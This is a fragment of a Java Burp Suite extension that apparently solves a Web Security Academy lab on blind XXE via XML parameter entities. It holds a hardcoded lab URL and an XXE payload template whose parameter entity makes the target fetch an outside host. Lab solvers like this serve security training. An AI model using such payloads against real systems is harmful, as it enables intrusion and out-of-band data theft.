...
public class LabSolver implements BurpExtension {
    ...
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.labUrl = "https://0a53005d0420505f809c125600130026.web-security-academy.net/";
        CookieHandler.setDefault(new CookieManager());

        api.extension().setName("Lab: Blind XXE with out-of-band interaction via XML parameter entities");
    ...
    <!DOCTYPE stockCheck [ <!ENTITY %% xxe SYSTEM "http://%s" > %%xxe; ]>
